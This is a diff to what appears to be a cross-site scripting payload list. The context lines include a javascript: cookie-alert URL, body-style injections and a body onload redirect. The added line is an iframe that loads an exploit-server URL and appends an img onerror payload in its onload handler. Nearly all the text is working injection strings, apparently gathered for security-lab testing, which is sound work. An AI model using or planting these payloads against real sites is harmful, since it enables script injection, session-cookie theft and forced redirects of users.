@@ -127,3 +127,4 @@ javascript:alert(document.cookie)
 <body style="background-color:red">
 <body style="background-color:red !important;">
 <body onload=window.location.assign('https://www.google.com')>
+<iframe src=" https://exploit-0ac100b6035d4ed983ddffc301800009.exploit-server.net/exploit" onload="this.src+='<img src=x onerror=print()>'"></iframe>
